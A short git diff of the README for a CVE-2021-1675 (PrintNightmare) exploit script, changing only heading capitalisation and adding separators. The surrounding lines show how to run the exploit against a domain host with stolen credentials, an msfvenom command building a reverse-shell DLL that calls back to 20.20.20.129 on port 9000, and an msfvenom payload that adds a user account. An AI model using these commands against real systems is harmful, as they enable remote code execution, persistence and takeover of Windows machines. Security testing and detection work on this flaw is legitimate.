@@ -19,7 +19,7 @@ git clone https://github.com/cube0x0/impacket
 cd impacket
 python3 ./setup.py install
 ```
-## usage
+## Usage
 ```
 usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share
 
@@ -50,14 +50,17 @@ CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
 ```
 
 ## DLL payloads
-### reverse shell
+### Reverse Shell
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=20.20.20.129 LPORT=9000 -f dll > rev.dll
 ```
-### adduser payload
+### Adduser Payload
 ```
 msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD_MATCHING_COPLEXITY>
 ```
+
+---
+---
 
 # Local Detection
 When runnnig:
